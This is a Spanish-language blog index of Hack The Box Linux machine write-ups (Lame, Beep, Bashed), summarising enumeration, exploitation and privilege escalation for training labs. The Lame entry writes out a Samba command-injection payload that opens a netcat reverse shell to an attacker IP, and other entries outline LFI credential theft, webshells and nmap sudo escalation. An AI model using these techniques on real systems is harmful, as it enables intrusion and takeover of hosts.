---
title: Hack The Box - ÍNDICE - LINUX
date: 2020-08-03 20:30:00 Z
---

* [**Lame**](https://sergiovalverde.github.io/2020/07/17/hack-the-box-lame.html) : Nos encontramos con los puertos **21,22,139,445,3632** abiertos. Enumeraremos los servicios samba con el fin de encontrar directorios.
Encontramos la **versión** de **Samba 3.0.20** la cuál es **vulnerable** y podremos ejecutar comandos con el **usuario Nohup**.
Con el comando siguiente: **"./=`nohup nc -e /bin/sh 10.10.14.24 443`"**
**No se observa correctamente el comando, falta ` ` al principio y final de la instrucción**.
Por otro enfoque, encontramos que el puerto **3632 distccd v1** es vulnerable, y con nmap haremos esa comprobación.
En la fase de **postexplotación**, haremos uso de **nmap** y su funcionalidad **--interactive**.


* [**BEEP**](https://sergiovalverde.github.io/2020/08/03/hack-the-box-beep-linux.html) : En está box, nos encontramos con el **portal web Elastix**, en el cuál damos con un **LFI**, permitiendonos **obtener usuarios y contraseña**.
La **explotación** podemos hacer vía ssh, con el usuario y pass conseguido. O **subiendo un modulo al panel FreePBX** el cuál conseguimos una **reverse shell**.
La **postexplotación** la haremos ejecutando **nmap** con privilegios sudo, y haciendo uso del modulo **interactive**.

* [**BASHED**](https://sergiovalverde.github.io/2020/08/06/hack-the-box-bashed.html) : Nos encontramos con un servidor web, en el cuál aloja una webshell [(phpbash.php)](https://github.com/Arrexel/phpbash).
A través de una reverse shell obtenemos usuario www-data.
En la fase de postexplotacion, escalamos a un usuario del sistema, listando los permisos con sudo -l, y alcanzamos root, modificanto un script, este script es ejecutado por el owner root.

